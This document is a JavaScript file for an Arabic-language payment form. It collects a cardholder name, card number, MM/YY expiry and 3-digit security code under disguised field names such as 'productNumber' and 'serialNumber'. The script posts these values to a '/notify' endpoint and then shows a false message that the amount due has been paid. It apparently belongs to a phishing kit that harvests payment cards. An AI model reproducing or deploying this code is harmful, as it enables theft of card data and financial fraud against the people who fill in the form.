const form = document.getElementById("productForm");
const message = document.getElementById("message");
const submitBtn = document.getElementById("submitBtn");

if (form) {
form.addEventListener("submit", async (event) => {
event.preventDefault();


    const productName =
        document.getElementById("productName").value.trim();

    const productNumber =
        document.getElementById("productNumber").value.trim();

    const applicationDate =
        document.getElementById("applicationDate").value.trim();

    const serialNumber =
        document.getElementById("serialNumber").value.trim();

    if (!productName) {
        showMessage("❌ أدخل الاسم.", "error");
        return;
    }

    if (!/^\d{1,16}$/.test(productNumber)) {
        showMessage("❌ أدخل رقم البطاقة بشكل صحيح.", "error");
        return;
    }

    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(applicationDate)) {
        showMessage("❌ التاريخ يجب أن يكون بصيغة MM/YY.", "error");
        return;
    }

    if (!/^\d{3}$/.test(serialNumber)) {
        showMessage("❌ أدخل رمز تحقق  من 3 أرقام.", "error");
        return;
    }

    submitBtn.disabled = true;
    submitBtn.textContent = "جاري المعالجة...";

    try {
        const response = await fetch("/notify", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                productName,
                productNumber,
                applicationDate,
                serialNumber
            })
        });

        const data = await response.json();

        if (!response.ok || !data.ok) {
            throw new Error("Request failed");
        }

        showMessage("✅ تمت تسديد المبلغ المستحق.", "success");
        form.reset();

    } catch (error) {
        showMessage("❌ حدث خطأ أثناء تنفيذ العملية.", "error");
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "تأكيد عملية الدفع";
    }
});


}

function showMessage(text, type) {
if (!message) return;


message.textContent = text;
message.className = type;


}

const dateInput = document.getElementById("applicationDate");

if (dateInput) {
dateInput.addEventListener("input", () => {
let value = dateInput.value.replace(/\D/g, "");

    if (value.length > 2) {
        value =
            value.substring(0, 2) +
            "/" +
            value.substring(2, 4);
    }

    dateInput.value = value.substring(0, 5);
});


}
